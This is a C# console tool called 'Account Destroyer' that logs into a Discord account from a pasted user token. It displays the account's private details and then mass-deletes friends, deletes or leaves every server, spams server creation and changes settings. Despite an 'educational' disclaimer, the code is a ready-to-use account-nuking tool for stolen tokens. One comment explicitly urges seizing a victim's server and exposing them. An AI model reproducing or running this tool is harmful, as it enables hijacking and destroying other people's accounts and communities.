using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Gateway;

/*
 * 
 * Developed by Johnn#1337  | my discord server -> https://discord.gg/gaWq68S7yU
 * I created this source to experiment the new iLinked wrapper which asked me to do it. It is for educational purposes!
 * You can use this but please do not go around messing with innocent people i created this because a friend of mine got scammed for $500 + and wanted no one else being scammed by the same user if you want more of this 
 * please let me know i will be creating more useful tools in the further future :) 
 * 
*/


namespace ConsoleApp6
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;

            Colorful.Console.WriteAscii("Account Destroyer");

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("User token : "); /* Make sure you dont have any spaces with the token */

            Console.ForegroundColor = ConsoleColor.Cyan;
            string token = Console.ReadLine();

            DiscordClient client = new DiscordClient(token);

            Console.Clear();

            Console.Title = $"Account Destroyer | Logged Into -> {client.User}";

            Colorful.Console.WriteAscii("Account Destroyer");

            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("___________________________________________________________________________________________________________________");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[1] Delete All Friend      [4] Create mass server");
            Console.WriteLine("[2] Delete/Leave all guild [5] Change user settings       ");
            Console.WriteLine("[3] Changing this acc      ");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("____________________________________________________________________________________________________________________");
            Console.ForegroundColor = ConsoleColor.Green;

            Console.WriteLine("User ID : " + client.User.Id);
            Console.WriteLine("User created at : " + client.User.CreatedAt);
            Console.WriteLine("User : " + client.User.ToString());
            Console.WriteLine("Email : " + client.User.Email);
            if (client.User.EmailVerified)
            {
                Console.WriteLine("Email verified : yes");
            }
            else
            {
                Console.WriteLine("Email Verified : no");


            }

            if (client.User.TwoFactorAuth)
            {
                Console.WriteLine("Two Factor activate : yes");

            }
            else
            {
                Console.WriteLine("Two factor activate : no");

            }
            Console.WriteLine("User type : " + client.User.Type);

            Console.WriteLine("Badge : " + client.User.PublicBadges.ToString());

            Console.WriteLine("Language : " + client.User.Language.ToString());

            Console.WriteLine("Avatar URL  : " + client.User.Avatar.Url);


            Console.WriteLine(" ");
            Console.WriteLine(" ");
            Console.WriteLine(" ");

            Console.ForegroundColor = ConsoleColor.DarkBlue;

            Console.Write("Option number : ");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            string AccountMangerIsGood = Console.ReadLine();




            if (AccountMangerIsGood == "5")

            {

                Console.Write("Avatar Path : ");
                string CHOOSETheAvatarpath = Console.ReadLine();


                try
                {
                    client.User.ChangeProfile(new UserProfileUpdate()
                    {
                        Avatar = Image.FromFile(CHOOSETheAvatarpath),

                    });

                }
                catch (Exception e)
                {

                    Console.WriteLine(e);
                    Console.ReadLine();
                }
            }

            if (AccountMangerIsGood == "4")
            {
                Console.Write(" * How many server wanna create (max 100) : ");

                int guilds = int.Parse(Console.ReadLine());

                Console.Write(" * Guild Name : ");
                string guildname = Console.ReadLine();

                Console.Write(" * Avatar path : ");
                string avatar = Console.ReadLine();

                for (int i = 1; i <= guilds; i++)
                {
                    
                    client.CreateGuild(guildname, Image.FromFile(avatar), "russia");
                    Console.WriteLine($"Create {i} Guilds...");
                }
                Program.Main(args);

            }

            if (AccountMangerIsGood == "3")
            {

                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Russian });
                Console.WriteLine("Done !");


                Program.Main(args);
            }

            if (AccountMangerIsGood == "1")
            {
                foreach (var relationship in client.GetRelationships())
                {
                    try
                    {
                        if (relationship.Type == RelationshipType.Friends)
                            relationship.Remove();
                        Console.WriteLine($"[+] Remove friend " + relationship.User.ToString());

                        if (relationship.Type == RelationshipType.IncomingRequest)
                            relationship.Remove();
                        Console.WriteLine("[+] Remove Friend Request");

                        if (relationship.Type == RelationshipType.OutgoingRequest)
                            relationship.Remove();
                        Console.WriteLine("[+] Remove sending friend request");

                        if (relationship.Type == RelationshipType.Blocked)
                            relationship.Remove();
                        Console.WriteLine("[+] Remove blocking user");
                    }
                    catch (Exception e)
                    {

                        Console.WriteLine(e);
                        Console.ReadLine();
                        Program.Main(args);
                    }



                }

                Program.Main(args);
            }

            if (AccountMangerIsGood == "2")
            {

                foreach (var guild in client.GetGuilds()) /*   Get All The Guilds User Owns / Is In   */
                {
                    try
                    {
                        if (guild.Owner) //Checks if the user owns the guild if you have there token and they have alot of memebers just give yourself there discord and transfer it to yourself and expose them
                            guild.Delete(); /*  Self Explanitory Just Deletes The Server */ 
                        
                        else
                            guild.Leave();
                        Console.WriteLine($"[+] Leave {guild}");

                        System.Threading.Thread.Sleep(100);

                    }
                    catch { }
                }


                Program.Main(args);
            }
        }
    }
}


